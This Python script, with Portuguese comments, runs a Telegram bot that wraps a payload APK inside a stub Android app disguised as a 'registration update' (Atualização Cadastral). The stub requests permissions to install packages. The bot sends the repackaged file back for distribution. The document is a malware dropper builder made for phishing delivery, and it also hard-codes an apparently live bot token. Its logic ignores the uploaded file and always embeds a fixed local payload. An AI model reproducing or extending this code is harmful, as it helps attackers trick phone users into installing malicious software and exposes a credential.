import os, zipfile, tempfile, shutil, logging, io, base64, subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters

TELEGRAM_TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"

# CAMINHO DO PAYLOAD
PAYLOAD_PATH = r"C:\Users\gagli\Downloads\ESTUDO APK\update_apk_decriptado.zip"

def criar_stub():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("AndroidManifest.xml", """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.atualizacao.cadastral"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <application android:label="Atualização Cadastral">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>""")
        z.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 100)
    return buffer.getvalue()

def transformar_apk(input_path, output_path):
    stub_data = criar_stub()
    with tempfile.NamedTemporaryFile(delete=False, suffix='.apk') as f:
        f.write(stub_data)
        stub_path = f.name
    
    os.makedirs("temp", exist_ok=True)
    with zipfile.ZipFile(stub_path, 'r') as z:
        z.extractall("temp/")
    
    os.makedirs("temp/assets", exist_ok=True)
    with open(PAYLOAD_PATH, 'rb') as f:
        payload_data = f.read()
    with open("temp/assets/update.apk", "wb") as f:
        f.write(payload_data)
    
    with zipfile.ZipFile(output_path, 'w') as z:
        for root, _, files in os.walk("temp/"):
            for file in files:
                path = os.path.join(root, file)
                arcname = os.path.relpath(path, "temp/")
                z.write(path, arcname)
    
    shutil.rmtree("temp/", ignore_errors=True)
    os.unlink(stub_path)
    return output_path

async def start(update, context):
    await update.message.reply_text("🤖 Envie um APK para transformar!")

async def handle_apk(update, context):
    await update.message.reply_text("📥 Processando...")
    file = await update.message.document.get_file()
    with tempfile.NamedTemporaryFile(delete=False, suffix='.apk') as f:
        await file.download_to_drive(f.name)
        input_path = f.name
    
    output_path = f"output_{update.message.chat_id}.apk"
    transformar_apk(input_path, output_path)
    
    await update.message.reply_document(
        document=open(output_path, "rb"),
        filename="Atualizacao_Cadastral.apk",
        caption="✅ APK transformado!"
    )
    os.unlink(input_path)
    os.unlink(output_path)

logging.basicConfig(level=logging.INFO)
app = Application.builder().token(TELEGRAM_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
print("🤖 BOT RODANDO!")
app.run_polling()